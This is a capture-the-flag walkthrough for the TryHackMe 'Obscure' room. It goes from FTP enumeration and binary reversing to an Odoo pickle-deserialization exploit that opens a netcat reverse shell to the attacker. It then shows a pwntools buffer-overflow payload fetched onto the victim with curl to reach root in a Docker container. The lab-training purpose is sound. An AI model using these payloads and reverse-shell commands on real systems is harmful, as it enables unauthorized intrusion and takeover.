# Obscure

**Room Link:** [https://tryhackme.com/r/room/obscured](https://tryhackme.com/r/room/obscured)



## **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1053).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1054).png" alt=""><figcaption></figcaption></figure>



## **TCP/21 - FTP**

**Kali**

```
ftp $VICTIM 21
Username: anonymous
```



**Kali(ftp)**

```
binary
passive
cd pub
mget *
```

<figure><img src="../../.gitbook/assets/image (1055).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1056).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo $VICTIM antisoft.thm >> /etc/hosts
cat /etc/hosts
```



We find a function that checks if the password is equal to 971234596, if it is the program gives us the password.

**Kali**

```
ghidra
```

<figure><img src="../../.gitbook/assets/image (1057).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
chmod +x password 
./password
971234596
```

<figure><img src="../../.gitbook/assets/image (1058).png" alt=""><figcaption></figcaption></figure>





**Login Credentials**

```
Username: admin@antisoft.thm
Password: SecurePassword123!
```

## Initial Shell <a href="#find-pages" id="find-pages"></a>

exploit: [https://www.exploit-db.com/exploits/44064](https://www.exploit-db.com/exploits/44064)

In order to exploit the vulnerability, you should navigate to the Apps page (the link is in the navigation bar at the top and search for and install \u201cDatabase Anonymization\u201d in the search bar. We have to deselect the Apps filter in the search bar for it to show up.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Install Database Anonymization&#x20;

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Once we have the module installed, we navigate to the settings page and select Anonymize database  under Database anonymization and click on the Anonymize Database button.&#x20;

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>



**exploit.py**

```
import cPickle
import os
import base64
import pickletools

class Exploit(object):
	def __reduce__(self):
		return (os.system, (("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $KALI 1337 >/tmp/f"),))
	

with open("exploit.pickle", "wb") as f:
	cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

**Kali**

```
python2.7 exploit.py
nc -lvnp 1337
```

Next, we refresh the page and navigate to the same page under settings. We upload the exploit.pickle file generated our script and click on Reverse the Database Anonymization button. We should have a reverse shell.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
script -qc /bin/bash /dev/null
ctrl + Z
stty raw -echo;fg
```



<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>



### Netcat <a href="#netcat" id="netcat"></a>

**Kali(receiving)**

```
nc -l -p 1234 > ret
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < ret
```



## Buffer Overflow <a href="#find-pages" id="find-pages"></a>

**Kali**

```
ghidra
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
cyclic 256
```

**Kali**

```
gdb ret
```

**Kali(gdb)**

```
gdb r
```

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

This tells us it crashes after 136 characters

**Kali**

```
cyclic -l 0x6261616a
```

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

We see the win function is located at 0x400646

**Kali**

```
objdump -t ret
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Confirmed it crashes after 136.

**Kali**

```
python -c 'print("A"* 137)' | ./ret 
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

I wanted to confirm it would crash where we expected so I added the program into a for loop

**payload.py - version 2**&#x20;

```
from pwn import *
import subprocess

for i in range(130, 140):
	payload = b'A'*i + p64(0x400646)
	print ("Current value: " + str(i))

	f = open('/root/payload.bin', 'wb')
	f.write(payload)
	f.close
	os.system("(cat payload.bin; cat) | ./ret")
```

We can see 137 did work on our local box and got us to the win function when adding it's address to the script

**Kali**

```
python payload.py 
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Now to create our payload and send it to the victim

**payload.py - version 2**&#x20;

```
from pwn import *

payload = b'A'*136 + p64(0x400646)

f = open('/root/payload.bin', 'wb')
f.write(payload)
f.close
```

Testing that the payload still works on our local machine.

**Kali**

```
(cat payload.bin; cat) | ./ret
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
python2 -m SimpleHTTPServer 82
```

We are root but only within the docker container.

**Victim**

```
cd /tmp
curl http://$KALI:82/payload.bin -o payload.bin
(cat payload.bin; cat) | /ret
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

#### &#x20;<a href="#find-pages" id="find-pages"></a>

**Victim(root)**

```
ip a
nmap 172.17.0.1
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>







